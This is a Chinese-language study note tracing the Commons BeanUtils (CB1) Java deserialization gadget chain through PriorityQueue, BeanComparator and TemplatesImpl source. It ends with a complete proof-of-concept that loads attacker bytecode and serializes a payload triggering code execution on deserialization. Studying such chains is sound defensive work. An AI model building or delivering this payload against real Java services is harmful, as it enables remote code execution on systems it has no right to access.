## CC链CB链分析

https://www.freebuf.com/articles/web/319397.html

1. source，入口点，一般就是readObject方法
2. sink，执行点，一般动态方法执行，JNDI注入，写文件之类的
3. gadget，连接入口执行的多个类，有几个条件：

- 类之间方法调用是链式的
- 类实例之间的关系是嵌套的
- 调用链上的类都需要是可以序列化的

## CB链分析

![](cb.jpg)

### JavaBean

**Apache Commons BeanUtils** 工具库中的核心类，主要用于对 Java Bean 的属性进行**反射式操作**，无需手动编写复杂的反射代码

来自org.apache.commons.beanutils.PropertyUtils;类

```
PropertyUtils.getProperty(new Person(), "name")
```

会执行Person类中getName()方法

### 链分析

- PriorityQueue

反序列化默认执行readObject方法

```
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    s.defaultReadObject();  
    s.readInt();  
    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);  
    queue = new Object[size];  
    for (int i = 0; i < size; i++)  
        queue[i] = s.readObject();  
	heapify();
}
```

跟踪heapify()方法

```
private void heapify() {  
    for (int i = (size >>> 1) - 1; i >= 0; i--)  
        siftDown(i, (E) queue[i]);  
}
```

要执行swiftDown()方法，size >= 2 (条件一 size>=2)

```
private void siftDown(int k, E x) {  
    if (comparator != null)  
        siftDownUsingComparator(k, x);  
    else  
        siftDownComparable(k, x);  
}
```

执行siftDownUsingComparator()方法，comparator != null (条件二 comparator != null)

```
private void siftDownUsingComparator(int k, E x) {  
    int half = size >>> 1;  
    while (k < half) {  
        int child = (k << 1) + 1;  
        Object c = queue[child];  
        int right = child + 1;  
        if (right < size &&  
            comparator.compare((E) c, (E) queue[right]) > 0)  
            c = queue[child = right];  
        if (comparator.compare(x, (E) c) <= 0)  
            break;  
        queue[k] = c;  
        k = child;  
    }  
    queue[k] = x;  
}
```

利用
```
public PriorityQueue(int initialCapacity,  
                     Comparator<? super E> comparator
```
构造方法，传入BeanComparator类并开辟空间，保证前面的条件满足

执行BeanComparator.compare()方法

- BeanComparator
```
public int compare( Object o1, Object o2 ) {  
      
    if ( property == null ) {  
        return comparator.compare( o1, o2 );  
    }  
      
    try {  
        Object value1 = PropertyUtils.getProperty( o1, property );  
        Object value2 = PropertyUtils.getProperty( o2, property );  
        return comparator.compare( value1, value2 );  
    }  
    catch ( IllegalAccessException iae ) {  
        throw new RuntimeException( "IllegalAccessException: " + iae.toString() );  
    }   
    catch ( InvocationTargetException ite ) {  
        throw new RuntimeException( "InvocationTargetException: " + ite.toString() );  
    }  
    catch ( NoSuchMethodException nsme ) {  
        throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );  
    }   
}
```

利用javabean反射，执行Templates.getOutputProperties()方法

- Templates
```
   public synchronized Properties getOutputProperties() {   
try {  
    return newTransformer().getOutputProperties();  
}  
catch (TransformerConfigurationException e) {  
    return null;  
}  
   }
```

执行newTransFormer

```
   public synchronized Transformer newTransformer()  
throws TransformerConfigurationException   
   {  
TransformerImpl transformer;  
  
transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  
    _indentNumber, _tfactory);  
  
if (_uriResolver != null) {  
    transformer.setURIResolver(_uriResolver);  
}  
  
if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {  
    transformer.setSecureProcessing(true);  
}  
return transformer;  
   }
```

执行getTransletInstance()

```
   private Translet getTransletInstance()  
throws TransformerConfigurationException {  
try {  
    if (_name == null) return null;  
    if (_class == null) defineTransletClasses();  
    AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  
           translet.postInitialization();  
    translet.setTemplates(this);  
    if (_auxClasses != null) {  
        translet.setAuxiliaryClasses(_auxClasses);  
    }  
    return translet;  
}
```

条件_name != null， \_class == null
执行defineTransletClasses()

```
private void defineTransletClasses()  
throws TransformerConfigurationException {  
if (_bytecodes == null) {  
    ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);  
    throw new TransformerConfigurationException(err.toString());  
}  
       TransletClassLoader loader = (TransletClassLoader)  
           AccessController.doPrivileged(new PrivilegedAction() {  
               public Object run() {  
                   return new TransletClassLoader(ObjectFactory.findClassLoader());  
               }  
           });  
try {  
    final int classCount = _bytecodes.length;  
    _class = new Class[classCount];  
    if (classCount > 1) {  
        _auxClasses = new Hashtable();  
    }  
    for (int i = 0; i < classCount; i++) {  
    _class[i] = loader.defineClass(_bytecodes[i]);  
    final Class superClass = _class[i].getSuperclass();  
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  
        _transletIndex = i;  
    }  
    else {  
        _auxClasses.put(_class[i].getName(), _class[i]);  
    }  
    }  
    if (_transletIndex < 0) {  
    ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  
    throw new TransformerConfigurationException(err.toString());  
    }  
}  
catch (ClassFormatError e) {  
    ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);  
    throw new TransformerConfigurationException(err.toString());  
}  
catch (LinkageError e) {  
    ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
    throw new TransformerConfigurationException(err.toString());  
}  
   }
```

loader.defineClass(_bytecodes[i])加载字节码

\_tfactory不为空防止空指针报错

poc

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.beanutils.BeanComparator;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class Test {  
  
    public static void setValue(Object obj, String fieldname, Object value) throws NoSuchFieldException, IllegalAccessException {  
        Field field = obj.getClass().getDeclaredField(fieldname);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
  
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {  
        TemplatesImpl templates = new TemplatesImpl();  
        setValue(templates, "_name", "aa");  
        setValue(templates, "_class", null);  
        setValue(templates, "_tfactory", new TransformerFactoryImpl());  
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\BaiduNetdiskDownload\\107-Java攻防篇-Shiro&CB1链分析&反序列化&项目工具等\\web\\src\\main\\java\\Evil.class"));  
        setValue(templates, "_bytecodes", new byte[][]{bytes});  
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);  
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);  
        priorityQueue.add("1");  
        priorityQueue.add("1");  
        setValue(beanComparator, "property", "outputProperties");  
        setValue(priorityQueue, "queue", new Object[]{templates, templates});  
        Serialize(priorityQueue);  
        Object deserialize = Deserialize();  
    }  
  
    public static void Serialize(Object obj) throws IOException {  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.txt"));  
        objectOutputStream.writeObject(obj);  
        objectOutputStream.close();  
    }  
    public static Object Deserialize() throws IOException, ClassNotFoundException {  
        Object o = new ObjectInputStream(new FileInputStream("ser.txt")).readObject();  
        return o;  
    }  
}
```

先add()再通过反射修改值，不然会覆盖